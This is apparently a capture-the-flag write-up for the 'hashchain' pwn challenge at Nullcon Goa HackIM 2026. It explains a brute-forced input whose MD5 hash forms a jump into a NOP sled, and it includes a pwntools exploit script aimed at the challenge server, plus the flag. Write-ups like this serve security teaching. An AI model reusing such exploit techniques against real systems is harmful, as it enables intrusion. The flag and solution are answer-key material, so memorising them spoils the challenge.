---
title: "hashchain - Nullcon Goa HackIM 2026 CTF"
category: "pwn"
type: "writeup"
tags: ["pwn", "pwntools", "hashchain", "nullcon-goa-hackim-2026-ctf", "2026", "ctf-writeup"]
summary: "Event: Nullcon Goa HackIM 2026 CTF"
source:
  name: "CTFtime writeup #40645"
  url: "https://ctftime.org/writeup/40645"
original_source: "https://github.com/RootRunners/Nullcon-Goa-HackIM-2026-CTF-RootRunners-Official-Write-ups/blob/main/PWN/hashchain/README.md"
ctf:
  name: "Nullcon Goa HackIM 2026 CTF"
  year: 2026
  challenge: "hashchain"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2026 CTF
- **Task:** hashchain
- **Author team:** RootRunners
- **CTFtime tags:** pwn
- **CTFtime:** <https://ctftime.org/writeup/40645>
- **Original writeup:** <https://github.com/RootRunners/Nullcon-Goa-HackIM-2026-CTF-RootRunners-Official-Write-ups/blob/main/PWN/hashchain/README.md>

---
# hashchain

**Event:** Nullcon Goa HackIM 2026 CTF   
**Category:** PWN   
**Points:** 173   
**Service:** `52.59.124.14:5010`

## Overview  
The binary computes MD5 hashes of user inputs, stores them in RWX memory, and then executes the first hash as x86-32 code. A huge NOP sled is mapped at a fixed address and ends with a `push win; ret` stub. We just need an input whose MD5 hash starts with a `jmp rel32` into the NOP sled.

## Key Observations  
\- Hash buffer mapped at `0x40000000` (RWX) and executed directly.  
\- NOP sled mapped at `0x41000000` (RWX), filled with `0x90`.  
\- End of sled contains `push 0x08049236; ret` (address of `win()`).  
\- If the MD5 hash begins with opcode `0xE9` (jmp rel32) and the offset lands in `0x41000000..0x41ffffff`, execution slides to the stub and prints the flag.

## Working Payload  
A valid input found by brute force:

```  
v + "G" * 86  
```

Its MD5 is:

```  
e9 59 1f 2c 01 e0 cc a3 0d 59 39 04 21 62 cd c2  
```

The first instruction is:

```  
jmp 0x412c1f5e  
```

which lands inside the NOP sled.

## Exploit (pwntools)  
```python  
#!/usr/bin/env python3  
from pwn import remote

HOST = "52.59.124.14"  
PORT = 5010

payload = b"v" + b"G" * 86

r = remote(HOST, PORT)  
r.recvuntil(b"> ")  
r.sendline(payload)  
r.recvuntil(b"> ")  
r.sendline(b"doit")  
print(r.recvall(timeout=5).decode(errors="ignore"))  
```

## Flag  
`ENO{h4sh_ch41n_jump_t0_v1ct0ry}`
